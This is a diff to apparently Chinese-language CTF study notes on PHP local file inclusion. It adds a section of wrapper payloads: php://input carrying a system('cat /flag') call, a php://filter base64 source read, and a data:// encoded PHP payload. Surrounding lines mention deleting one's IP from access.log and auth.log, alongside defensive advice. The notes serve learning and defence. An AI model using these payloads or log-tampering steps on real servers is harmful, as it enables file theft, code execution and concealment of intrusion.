@@ -1,3 +1,5 @@
+#### LFI
+
 ```
 LFI:本地文件包含漏洞 危害
 ------------------------
@@ -50,7 +52,7 @@ LFI:本地文件包含漏洞 危害
 	伪造日志：修改我们在前面提到的 access.log 或系统日志 /var/log/auth.log，删除包含自己 IP 的记录
 ```
 
-
+#### 防御
 
 ```
 #防御
@@ -61,5 +63,15 @@ LFI:本地文件包含漏洞 危害
 权限最小化：PHP 进程绝对不应有读取 /var/log/ 或系统敏感文件的权限
 出口防火墙策略：服务器防火墙应限制主动向外发起连接
 定期审计日志：使用自动化工具监控 access.log 中的异常 Payload（如 bash -i 这种字符串）
+```
+
+#### 伪协议
+
+```
+PHP 伪协议 
+当直接读取被禁止，或需要执行代码时：
+php://input			# URL 填 ?file=php://input，POST 发送 <?php system('cat /flag');?>。
+php://filter		# 读取源码必备：?file=php://filter/read=convert.base64-encode/resource=flag.php。
+data://		 		# ?file=data://text/plain;base64,PD9waHAg--c3lzdGVtKCdj--YXQgL2ZsYWc--nKTsgPz4=
 ```
 
